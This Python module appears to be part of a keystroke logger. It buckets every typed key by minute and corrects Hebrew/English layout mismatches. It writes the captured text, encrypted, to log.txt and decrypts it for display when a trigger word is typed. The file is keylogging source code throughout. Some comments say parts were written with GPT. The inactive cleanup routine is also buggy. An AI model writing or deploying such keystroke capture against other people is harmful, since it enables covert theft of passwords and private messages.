import time,ctypes,locale
import encryption as enc
from from_show import play_form


main_arr = {}
queue_arr = {}
foreign_inputs = []
current_minute = ''

def cleaner():
    # לא פעיל בנתיים
    global main_arr,queue_arr
    for item in main_arr:
        if main_arr[item] is None:
            del main_arr[item]
    for item in queue_arr:
        if main_arr[item] is None:
            print(1)
            del main_arr[item]


#Writen all the function with GPT
def get_keyboard_language():
    try:
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        hwnd = user32.GetForegroundWindow()
        if hwnd == 0:
            thread_id = ctypes.windll.kernel32.GetCurrentThreadId()
        else:
            thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        if not thread_id:
            return "en-US"
        hkl = user32.GetKeyboardLayout(thread_id)
        if not hkl:
            return "en-US"
        language_id = hkl & 0xFFFF
        language = locale.windows_locale.get(language_id, "en-US")
        return language
    except Exception:
        return "en-US"

#Writen the base of the function with GPT
def get_key_language(one_key):
    try:
        if '\u0590' <= one_key <= '\u05FF':
            return "he_IL"
        else:
            return "en_US"
    except Exception as e:
        return f"Error: {e}"


def format_language(one_key,old_l,new_l):
    en_keyboard = ("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l",";","'","z","x","c","v","b","n","m",",",".","/")
    he_keyboard = ("/","'","ק","ר","א","ט","ו","ן","ם","פ","ש","ד","ג","כ","ע","י","ח","ל","ך","ף",",","ז","ס","ב","ה","נ","מ","צ","ת","ץ",".")
    try:
        if old_l == 'en_US':
            index = en_keyboard.index(one_key)
        elif old_l == 'he_IL':
            index = he_keyboard.index(one_key)
        else:
            index = 0
    except ValueError:
        index = 0
        print(one_key,old_l,new_l)
    if new_l == 'en_US':
        return en_keyboard[index]
    if new_l == 'he_IL':
        return he_keyboard[index]


def write_file():
    text = ""
    for minute,key in main_arr.items():
        text +=f"******{minute}******\n{key}\n\n"
    enc_text = enc.local_encrypt(text)
    with open('log.txt', 'wb', ) as f:
        f.write(enc_text)

def actions_center(mode):
    global queue_arr,foreign_inputs
    if queue_arr[current_minute].find("show") != -1:
        queue_arr[current_minute] = queue_arr[current_minute].replace("show", "")
        queue_arr = print_queue(queue_arr)
        if mode == 'from':
            with open('log.txt', 'rb') as f:
                enc_text = f.read()
            text_to_show = enc.local_decrypt(enc_text, 'key.key')
            play_form(text_to_show)


    elif len(foreign_inputs)>1:
        if foreign_inputs[-1]=='\\x11' and foreign_inputs[-2] == 'Key.ctrl_l':
            print("Ending...")
            return True


def format_key(key):
    global foreign_inputs
    key1 = str(key).replace("'", "")
    if key1 == 'Key.space':
        return ' '
    elif key1 == 'Key.enter':
        return '\n'
    elif key1.startswith('Key') or key1.startswith('\\'):
        foreign_inputs.append(key1)
        return ''
    else:
        key_l = get_key_language(key1)
        keyboard_l = get_keyboard_language()
        if key_l == keyboard_l:
            return key1
        else:
            return format_language(key1,key_l,keyboard_l)

def print_key_press(key):
    print(key)
    # print(foreign_inputs)



def save_to_arrays(key):
    global main_arr,queue_arr,current_minute
    current_minute = time.strftime('%d/%m/%Y %H:%M')

    if current_minute not in main_arr:
        main_arr[current_minute]=""
    if current_minute not in queue_arr:
        queue_arr[current_minute] = ""

    main_arr[current_minute]+=key
    queue_arr[current_minute]+=key


def print_queue (queue):
    for minute,key in queue.items():
        print(f"******{minute}******\n{key}\n\n")
    return {}